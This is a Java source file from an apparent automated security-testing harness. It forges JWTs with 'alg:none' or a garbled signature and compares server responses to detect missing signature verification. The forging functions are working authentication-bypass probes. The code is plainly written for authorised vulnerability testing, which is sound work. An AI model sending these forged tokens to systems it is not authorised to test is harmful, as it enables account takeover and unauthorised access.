package com.harness.llm.logic;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Pattern;

/**
 * Forgery + classification logic for jwt_validation. Montoya-free --
 * base64url and a narrow regex substitution on the header segment only
 * (never touching the payload or attempting to forge a valid signature),
 * no JSON library needed for this narrow a task. Ties directly to the
 * alg:none finding worked through by hand earlier this project (see
 * testing/test-target/) -- this is that same check, now something the
 * harness can run deterministically instead of a human reasoning through
 * it.
 */
public final class JwtForgeryLogic {

    public enum Verdict { CONFIRMED, SUPPORTED, INVALID, REJECTED }

    public record Evidence(Verdict verdict, double confidence, boolean confirmed, String summary, String detail) {}

    private static final Pattern ALG_FIELD = Pattern.compile("\"alg\"\\s*:\\s*\"[^\"]*\"");

    private JwtForgeryLogic() {}

    /** True if `token` has the three dot-separated segments a JWT needs.
     * Doesn't verify anything about validity, just shape -- deliberately
     * permissive about the signature segment being empty, since that's
     * exactly what an alg:none forgery looks like. */
    public static boolean looksLikeJwt(String token) {
        if (token == null) return false;
        String[] parts = token.split("\\.", -1);
        return parts.length == 3 && !parts[0].isEmpty() && !parts[1].isEmpty();
    }

    private static String b64UrlDecode(String s) {
        return new String(Base64.getUrlDecoder().decode(pad(s)), StandardCharsets.UTF_8);
    }

    private static String b64UrlEncode(String s) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    private static String pad(String s) {
        int rem = s.length() % 4;
        return rem == 0 ? s : s + "=".repeat(4 - rem);
    }

    /**
     * Forges an alg:none token carrying the ORIGINAL, unmodified payload
     * -- this probes whether signature verification is enforced at all,
     * not whether claims can be tampered with; a server accepting this
     * is vulnerable either way, and leaving the payload untouched keeps
     * the probe from also being a (separate, not-yet-proven) privilege
     * escalation attempt. Returns null if the token isn't JWT-shaped or
     * the header segment doesn't decode as UTF-8/valid base64url.
     */
    public static String forgeAlgNone(String originalToken) {
        if (!looksLikeJwt(originalToken)) return null;
        String[] parts = originalToken.split("\\.", -1);
        try {
            String headerJson = b64UrlDecode(parts[0]);
            var matcher = ALG_FIELD.matcher(headerJson);
            String forgedHeaderJson = matcher.find() ? matcher.replaceFirst("\"alg\":\"none\"") : headerJson;
            String forgedHeader = b64UrlEncode(forgedHeaderJson);
            return forgedHeader + "." + parts[1] + ".";
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Forges a token with the same header/payload but a garbled
     * signature -- a second, independent probe of whether the signature
     * is checked at all (distinct from the alg:none-specific bypass
     * above; a server could reject alg:none but still fail to verify a
     * garbled-but-present signature under its normal algorithm).
     */
    public static String forgeGarbledSignature(String originalToken) {
        if (!looksLikeJwt(originalToken)) return null;
        String[] parts = originalToken.split("\\.", -1);
        return parts[0] + "." + parts[1] + ".AAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    }

    /**
     * @param forgedVariant which forgery was attempted, for the summary text
     * @param originalStatus status code of the original, legitimately-signed request
     * @param forgedStatus status code of the forged-token request
     * @param originalBodyLength length of the original response body, for a coarse shape comparison
     * @param forgedBodyLength length of the forged-token response body
     */
    public static Evidence evaluate(String forgedVariant, int originalStatus, int forgedStatus,
                                     int originalBodyLength, int forgedBodyLength) {
        boolean sameStatus = originalStatus == forgedStatus;
        boolean statusLooksAuthenticated = forgedStatus >= 200 && forgedStatus < 300;
        boolean similarBodyShape = originalBodyLength > 0
                && Math.abs(originalBodyLength - forgedBodyLength) < Math.max(20, originalBodyLength / 10);

        if (sameStatus && statusLooksAuthenticated && similarBodyShape) {
            return new Evidence(Verdict.CONFIRMED, 0.9, true,
                    "A forged token (" + forgedVariant + ") was accepted with the same status code ("
                            + forgedStatus + ") and a similarly-shaped response body as the original, "
                            + "legitimately-signed request -- the server is not verifying the token's signature.",
                    "original status=" + originalStatus + " len=" + originalBodyLength
                            + " | forged status=" + forgedStatus + " len=" + forgedBodyLength);
        }
        if (statusLooksAuthenticated) {
            return new Evidence(Verdict.SUPPORTED, 0.55, false,
                    "A forged token (" + forgedVariant + ") received a 2xx status, but the response shape "
                            + "differs enough from the original that this may be a different code path -- "
                            + "worth a manual comparison rather than treating this as confirmed.",
                    "original status=" + originalStatus + " len=" + originalBodyLength
                            + " | forged status=" + forgedStatus + " len=" + forgedBodyLength);
        }
        return new Evidence(Verdict.REJECTED, 0.8, false,
                "The forged token (" + forgedVariant + ") was rejected (status " + forgedStatus
                        + ") -- signature verification appears to be enforced for this bypass attempt.",
                "forged status=" + forgedStatus);
    }
}
